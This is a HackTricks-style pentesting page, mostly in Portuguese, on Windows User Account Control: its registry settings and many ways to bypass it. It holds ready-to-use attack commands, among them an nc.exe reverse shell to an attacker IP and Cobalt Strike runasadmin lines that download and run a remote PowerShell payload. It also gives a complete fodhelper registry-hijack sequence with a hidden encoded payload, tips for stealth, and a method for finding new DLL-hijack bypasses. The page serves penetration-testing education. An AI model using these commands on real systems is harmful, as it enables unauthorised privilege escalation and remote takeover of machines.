# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é uma funcionalidade que habilita um **prompt de consentimento para atividades elevadas**. Aplicações têm diferentes níveis de `integrity`, e um programa com um **nível high** pode executar tarefas que **podem potencialmente comprometer o sistema**. Quando o UAC está ativado, aplicações e tarefas sempre **são executadas no contexto de segurança de uma conta não-administradora** a menos que um administrador autorize explicitamente que essas aplicações/tarefas tenham acesso de nível administrador ao sistema para serem executadas. É uma funcionalidade de conveniência que protege administradores de alterações não intencionais, mas não é considerada uma fronteira de segurança.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: um token de usuário padrão, para realizar ações regulares em nível normal, e outro com os privilégios de admin.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute em profundidade como o UAC funciona e inclui o processo de logon, a experiência do usuário e a arquitetura do UAC. Administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização a nível local (usando secpol.msc), ou configuradas e distribuídas via Group Policy Objects (GPO) em um ambiente de Active Directory domain. As várias configurações são discutidas em detalhe [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Existem 10 Group Policy settings que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.

Many auto-elevate processes expose **functionality via COM objects or RPC servers**, which can be invoked from processes running with medium integrity (regular user-level privileges). Note that COM (Component Object Model) and RPC (Remote Procedure Call) are methods Windows programs use to communicate and execute functions across different processes. For example, **`IFileOperation COM object`** is designed to handle file operations (copying, deleting, moving) and can automatically elevate privileges without a prompt.

Note that some checks might be performed, like checking if the process was run from the **System32 directory**, which can be bypassed for example **injecting into explorer.exe** or another System32-located executable.

Another way to bypass these checks is to **modify the PEB**. Every process in Windows has a Process Environment Block (PEB), which includes important data about the process, such as its executable path. By modifying the PEB, attackers can fake (spoof) the location of their own malicious process, making it appear to run from a trusted directory (like system32). This spoofed information tricks the COM object into auto-elevating privileges without prompting the user.

Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.

You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. (`sigcheck.exe -m <file>`) And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).

### Check UAC

Para confirmar se o UAC está habilitado faça:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se for **`1`**, então o UAC está **ativado**, se for **`0`** ou se **não existir**, então o UAC está **inativo**.

Em seguida, verifique **qual nível** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)  
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)  
- If **`2`** (**Sempre notificar-me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)  
- If **`3`** like `1` but not necessary on Secure Desktop  
- If **`4`** like `2` but not necessary on Secure Desktop  
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Resumo

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

Você também pode verificar os grupos do seu usuário e obter o nível de integridade:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Observe que se você tem acesso gráfico à vítima, o bypass do UAC é simples, pois você pode simplesmente clicar em "Yes" quando o prompt do UAC aparecer

O UAC bypass é necessário na seguinte situação: **o UAC está ativado, seu processo está rodando em um contexto de integridade média, e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil contornar o UAC se ele estiver no nível de segurança mais alto (Always) do que se estiver em qualquer um dos outros níveis (Default).**

### UAC desativado

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` é **`0`**) você pode **executar um reverse shell com privilégios de administrador** (nível de integridade alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** Básico UAC "bypass" (acesso completo ao sistema de arquivos)

Se você tem uma shell com um usuário que pertence ao grupo Administrators, você pode **montar o compartilhamento C$** via SMB (sistema de arquivos) local em um novo disco e terá **acesso a tudo dentro do sistema de arquivos** (até mesmo a pasta home do Administrator).

> [!WARNING]
> **Parece que esse truque não funciona mais**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass com cobalt strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no nível máximo de segurança
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também possuem vários módulos para **bypass** do **UAC**.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) que é uma **compilation** de vários UAC bypass exploits. Observe que você precisará **compile UACME using visual studio or msbuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), você precisará saber **qual você precisa.**

Você deve **ter cuidado** porque alguns bypasses irão **iniciar alguns outros programas** que vão **alertar** o **usuário** de que algo está acontecendo.

UACME indica a **versão de build a partir da qual cada técnica começou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Além disso, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) você obtém a versão do Windows `1607` a partir dos números de build.

### UAC Bypass – fodhelper.exe (Registry hijack)

O binário confiável `fodhelper.exe` é auto-elevado no Windows moderno. Ao ser executado, ele consulta o caminho de registro por usuário abaixo sem validar o verbo `DelegateExecute`. Plantando um comando ali permite que um processo de Medium Integrity (o usuário está em Administrators) inicie um processo de High Integrity sem um prompt UAC.

Caminho de registro consultado por fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Passos do PowerShell (defina seu payload, depois acione):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notas:
- Funciona quando o usuário atual é membro de Administrators e o nível do UAC é padrão/leniente (não Always Notify com restrições adicionais).
- Use o caminho `sysnative` para iniciar um PowerShell 64-bit a partir de um processo 32-bit no Windows 64-bit.
- Payload pode ser qualquer comando (PowerShell, cmd, ou um caminho EXE). Evite UIs que solicitem interação para manter sigilo.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** com a vítima (um shell comum nc.exe não é suficiente).

Você pode obter isso usando uma sessão **meterpreter**. Migre para um **process** que tenha o valor **Session** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

Se você tem acesso a uma **GUI você pode simplesmente aceitar o UAC prompt** quando ele aparecer, você realmente não precisa de um bypass. Portanto, obter acesso a uma GUI permitirá que você bypass o UAC.

Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP) existem **algumas ferramentas que estarão em execução como administrator** das quais você poderia **run** um **cmd** por exemplo **as admin** diretamente sem ser solicitado novamente pelo UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **stealthy**.

### Noisy brute-force UAC bypass

Se você não se importa em ser noisy você sempre pode **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

Se você der uma olhada no **UACME** você notará que **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encontre um binary que irá **autoelevate** (verifique que ao ser executado ele roda em um nível de integridade alto).
2. Com procmon encontre eventos "**NAME NOT FOUND**" que podem ser vulneráveis a **DLL Hijacking**.
3. Provavelmente você precisará **write** a DLL dentro de alguns **protected paths** (como C:\Windows\System32) onde você não tem permissões de escrita. Você pode bypass isso usando:
1. **wusa.exe**: Windows 7,8 and 8.1. Permite extrair o conteúdo de um CAB file dentro de protected paths (porque essa ferramenta é executada em um nível de integridade alto).
2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL dentro do protected path e executar o binary vulnerável e autoelevated.

### Another UAC bypass technique

Consiste em observar se um **autoElevated binary** tenta **read** do **registry** o **name/path** de um **binary** ou **command** a ser **executed** (isso é mais interessante se o binary busca essa informação dentro do **HKCU**).

## Referências
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
